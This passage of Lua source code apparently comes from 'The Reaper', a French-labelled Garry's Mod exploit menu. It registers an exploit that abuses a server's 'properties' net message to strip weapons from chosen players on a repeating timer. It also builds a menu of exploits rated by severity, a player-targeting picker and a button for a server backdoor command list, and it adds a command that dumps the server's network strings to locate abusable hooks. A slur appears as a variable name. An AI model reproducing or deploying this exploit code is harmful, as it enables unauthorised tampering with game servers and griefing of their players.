ent.LNextNuke = CurTime() + 0.5
end
local function nukeallweapons( tab )
for k, v in pairs( tab ) do
if !v:IsValid() then continue end
if v.LNextNuke and v.LNextNuke > CurTime() then continue end
FAUCHEUSE.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( v )
net.SendToServer()
end
end
FAUCHEUSE.AddExploit( "Supprimer les armes", {
desc = "Supprimer les armes de n'importes qui.",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "properties" ) and (!FPP or (FPP and FPP.Settings.FPP_TOOLGUN1.worldprops == 1)) end,
functions = {
{ typ = "string", name = "Type d'Arme à Strip", default = ":3", addr = "stripper_gunz" },
{ typ = "players", addr = "stripper_plyz" },
{ typ = "func", name = "Strip", func = function()
if !timer.Exists( "stripclub" ) then
FAUCHEUSE.ChatText( "Strip Activé" )
timer.Create( "stripclub", 0.5, 0, function()
local t = FAUCHEUSE.GetStored( "stripper_plyz", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local gunz = v:GetWeapons()
local findstring = FAUCHEUSE.GetStored( "stripper_gunz", "*" )
if findstring == "*" then nukeallweapons( gunz ) return end
local findstringtab = string.Explode( ", ", findstring )
for _, g in pairs( gunz ) do
for _, s in pairs( findstringtab ) do
if string.find( string.lower( g:GetClass() ), s ) then
nukeweapon( g )
end
end
end
end
end)
else
timer.Remove( "stripclub" )
FAUCHEUSE.ChatText( "Strip Desactivé" )
end
end, },
},
} )
function FAUCHEUSE.MakeFunctionButton( parent, x, y, btext, func, tooltip)
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y - 4 )
TButton:SetFont( "TargetIDSmall" )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 26 )
if tooltip then TButton:SetToolTip( tooltip ) end
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(math.random(0,150),math.random(0,150),math.random(0,150)))
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(25, 25, 25, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
func()
end
return TButton:GetWide(), TButton:GetTall()
end
function FAUCHEUSE.HTXBackdoor( parent, x, y, btext )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y - 4 )
TButton:SetText( btext )
TButton:SetFont( "TargetIDSmall" )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 26 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(math.random(1,255),math.random(1,255),math.random(1,255)))
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(25, 25, 25, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
FAUCHEUSE.HTXCommandeListe()
end
return TButton:GetWide(), TButton:GetTall()
end
function FAUCHEUSE.MakePlayerSelectionButton( parent, x, y, addr )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y - 4 )
TButton:SetFont( "TargetIDSmall" )
TButton:SetText( "Cibles" )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 26 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(math.random(0,150),math.random(0,150),math.random(0,150)))
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(25, 25, 25, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
FAUCHEUSE.SelectPlayersPanel( addr )
end
return TButton:GetWide(), TButton:GetTall()
end
function FAUCHEUSE.SelectPlayersPanel( addr )
if FAUCHEUSE.PlayerSelector and FAUCHEUSE.PlayerSelector:IsVisible() then FAUCHEUSE.PlayerSelector:Remove() end
local plytab = FAUCHEUSE.GetStored( addr, {} )
FAUCHEUSE.PlayerSelector = vgui.Create("DFrame")
FAUCHEUSE.PlayerSelector:SetSize(250,400)
FAUCHEUSE.PlayerSelector:SetTitle("Joueur(s) à cibler")
FAUCHEUSE.PlayerSelector:SetPos( gui.MouseX(), gui.MouseY() )
FAUCHEUSE.PlayerSelector:MakePopup()
FAUCHEUSE.PlayerSelector.Paint = function( s, w, h )
if !FAUCHEUSE.Menu or !FAUCHEUSE.Menu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 125) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(255, 255, 255, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local Plist = vgui.Create( "DPanelList", FAUCHEUSE.PlayerSelector )
Plist:SetSize( FAUCHEUSE.PlayerSelector:GetWide() - 10, FAUCHEUSE.PlayerSelector:GetTall() - 55 )
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 5, 40 )
Plist:SetName( "" )
local target1 = vgui.Create("DButton", FAUCHEUSE.PlayerSelector)
target1:SetSize( 40, 20 )
target1:SetPos( 10, 23 )
target1:SetText("Tous")
target1:SetTextColor(Color(255, 255, 255, 255))
target1.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target1.DoClick = function()
for _, p in pairs(player.GetAll()) do
if not table.HasValue( plytab, p ) then
table.insert( plytab, p )
end
end
FAUCHEUSE.Store( addr, plytab )
end
local target2 = vgui.Create("DButton", FAUCHEUSE.PlayerSelector)
target2:SetSize( 40, 20 )
target2:SetPos( 55, 23 )
target2:SetText("Aucun")
target2:SetTextColor(Color(255, 255, 255, 255))
target2.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target2.DoClick = function()
table.Empty( plytab )
FAUCHEUSE.Store( addr, plytab )
end
local target3 = vgui.Create("DButton", FAUCHEUSE.PlayerSelector )
target3:SetSize( 40, 20 )
target3:SetPos( 100, 23 )
target3:SetText("Moi")
target3:SetTextColor(Color(255, 255, 255, 255))
target3.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target3.DoClick = function()
table.Empty( plytab )
table.insert( plytab, LocalPlayer() )
FAUCHEUSE.Store( addr, plytab )
end
local target4 = vgui.Create( "DTextEntry", FAUCHEUSE.PlayerSelector )
target4:SetPos( 145, 23 )
target4:SetSize( 95, 20 )
target4:SetText( "" )
target4.OnChange = function( self )
local nam = self:GetValue()
local namtab = string.Explode( ", ", nam )
table.Empty( plytab )
for _, pl in pairs( player.GetAll() ) do
for _, s in pairs( namtab ) do
if string.find( string.lower( pl:Nick() ), s ) then
table.insert( plytab, pl )
end
end
end
FAUCHEUSE.Store( addr, plytab )
end
for k, v in pairs( player.GetAll() ) do
local plypanel2 = vgui.Create( "DPanel" )
plypanel2:SetPos( 0, 0 )
plypanel2:SetSize( 200, 25 )
local teamcol = team.GetColor( v:Team() )
plypanel2.Paint = function( s, w, h )
if !v:IsValid() then return end
surface.SetDrawColor( Color(30, 30, 30, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( teamcol )
surface.DrawRect( 0, h - 3, w, 3 )
surface.SetDrawColor( Color(55, 55, 55, 245) )
surface.DrawOutlinedRect( 0, 0, w, h )
if table.HasValue( plytab, v ) then surface.SetDrawColor( HSVToColor( CurTime() % 6 * 60, 1, 1 ) ) end
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
local plyname = vgui.Create( "DLabel", plypanel2 )
plyname:SetPos( 10, 5 )
plyname:SetFont( "Trebuchet18" )
local tcol = Color( 255, 255, 255 )
if v == LocalPlayer() then tcol = Color( 155, 155, 255 ) end
plyname:SetColor( tcol )
plyname:SetText( v:Nick() )
plyname:SetSize(180, 15)
local faggot = vgui.Create("DButton", plypanel2 )
faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )
faggot:SetPos( 0, 0 )
faggot:SetText("")
faggot.Paint = function(panel, w, h)
return
end
faggot.DoClick = function()
if table.HasValue( plytab, v ) then
table.RemoveByValue( plytab, v )
else
table.insert( plytab, v )
end
FAUCHEUSE.Store( addr, plytab )
end
Plist:AddItem( plypanel2 )
end
end
function FAUCHEUSE.MakeTextInputButton( parent, x, y, btext, default, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y - 4 )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(math.random(0,150),math.random(0,150),math.random(0,150)))
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(25, 25, 25, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetFont( "TargetIDSmall" )
tttt:SetText( btext )
tttt:SetTextColor ( Color(255,255,255))
tttt:SizeToContents()
local tentry = vgui.Create( "DTextEntry", hostframe )
tentry:SetPos( 12 + tttt:GetWide(), 3 )
tentry:SetSize( 100, 20 )
tentry:SetText( FAUCHEUSE.GetStored( addr, default ) )
tentry.OnChange = function( self )
FAUCHEUSE.Store( addr, self:GetValue() )
end
hostframe:SetSize( 20 + tttt:GetWide() + tentry:GetWide(), 26 )
return hostframe:GetWide(), hostframe:GetTall()
end
function FAUCHEUSE.MakeNumberInputButton( parent, x, y, btext, default, min, max, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y - 4 )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(255, 255, 255, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 50, 50, 50 ) )
surface.SetMaterial( degraderbas )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetText( btext )
tttt:SizeToContents()
local wangmeoff = vgui.Create( "DNumberWang", hostframe )
wangmeoff:SetPos( 10 + tttt:GetWide(), 2 )
wangmeoff:SetSize( 75, 20 )
wangmeoff:SetDecimals( 2 )
wangmeoff:SetMinMax( min , max )
wangmeoff:SetValue( FAUCHEUSE.GetStored( addr, default ) )
wangmeoff:SetAllowNonAsciiCharacters(false)
wangmeoff.OnValueChanged = function( self, val )
FAUCHEUSE.Store( addr, self:GetValue() )
end
hostframe:SetSize( 13 + tttt:GetWide() + wangmeoff:GetWide(), 24 )
return hostframe:GetWide(), hostframe:GetTall()
end
local FillFrameRates = RatesScaleLevel
concommand.Add( "reaperexploits", function()
if true
then FAUCHEUSE.Menu = vgui.Create("DFrame")
FAUCHEUSE.Menu:SetSize(750,400)
FAUCHEUSE.Menu:SetTitle("[Lokidev Menu Edited] Skin By Zilnix")
FAUCHEUSE.Menu:Center()
FAUCHEUSE.Menu:MakePopup()
FAUCHEUSE.Menu.gay = table.Count( FAUCHEUSE.sploits )
FAUCHEUSE.Menu.Paint = function( s, w, h )
surface.SetDrawColor( Color(0,0,0,230))
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
surface.SetDrawColor( Color(0, 0, 0, 220) )
surface.DrawRect( 160, 20, w - 300, h - 680 )
draw.DrawText( "THE REAPER", "DermaLarge", 310, 25, Color(255,255,255, 255) )
draw.DrawText( "LA FAUCHEUSE DE GARRY'S MOD", "Trebuchet24", 250, 50, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
draw.DrawText( "EXPLOITS MENU", "Trebuchet24", 320, 75, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
end
local Plist = vgui.Create( "DPanelList", FAUCHEUSE.Menu )
Plist:SetSize( FAUCHEUSE.Menu:GetWide() - 90, FAUCHEUSE.Menu:GetTall() - 155 ) -- Taille Navigateur
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 50, 120 )
Plist:SetName( "" )
local function CreateSploitPanel( name, t )
if !FAUCHEUSE.Menu then return end
local cmdp = vgui.Create( "DPanel" )
cmdp:SetSize( Plist:GetWide(), 75 ) -- Taille Cases
cmdp.Cmd = name -- Set nom exploit(s)
cmdp.Desc = t.desc -- Set description exploit(s)
cmdp.Paint = function( s, w, h ) -- Gui
surface.SetDrawColor( Color(0,0,0,10)) -- Couleur
surface.DrawRect( 10, 10, w, h ) -- Cases
surface.SetDrawColor( severitycols[t.severity] ) -- Contours Cases
surface.DrawOutlinedRect( 0, 0, w, h ) 
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
draw.DrawText( cmdp.Cmd, "TargetID", 10, 5, Color(255,255,255) )
-- draw.DrawText( cmdp.Desc, "DebugFixed", 10, 30, Color(255,255,255, 255) ) -- Descriptions
end


--SCROLLING DE TEXTE



-- DIFFERENTS BOUTONS
local x = 10
for _, tab in ipairs( t.functions ) do
if tab.typ == "func" then
x = (x + 5) + FAUCHEUSE.MakeFunctionButton( cmdp, x, 42, tab.name, tab.func )
elseif tab.typ == "players" then
x = (x + 5) + FAUCHEUSE.MakePlayerSelectionButton( cmdp, x, 42, tab.addr )
elseif tab.typ == "htxcommandeliste" then
x = (x + 5) + FAUCHEUSE.HTXBackdoor( cmdp, x, 42, tab.name )
elseif tab.typ == "string" then
x = (x + 5) + FAUCHEUSE.MakeTextInputButton( cmdp, x, 42, tab.name, tab.default, tab.addr )
if !FAUCHEUSE.IsStored( tab.addr ) then FAUCHEUSE.Store( tab.addr, tab.default ) end
elseif tab.typ == "float" then
x = (x + 5) + FAUCHEUSE.MakeNumberInputButton( cmdp, x, 42, tab.name, tab.default, tab.min, tab.max, tab.addr )
if !FAUCHEUSE.IsStored( tab.addr ) then FAUCHEUSE.Store( tab.addr, tab.default ) end
end
end
Plist:AddItem( cmdp )
--Zlist:AddItem( zmod ) -- PARTIE DU NOUVEAU PANEL
end
-- DIFFERENTS BOUTONS
for k, v in pairs( FAUCHEUSE.sploits ) do
if v.scan() then CreateSploitPanel( k, v ) end
end
else
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
return end
end)
 -- ne pas toucher cac checker end !!!
concommand.Add("_Strings", function()
local netstrings = {}
for i = 1, 9999 do
local s = util.NetworkIDToString( i )
if s then print( "[The Reaper] NetChannel "..i.." = "..s ) else break end
end
end)

-- THE REAPER 2018 - BY ZILNIX :)
]]);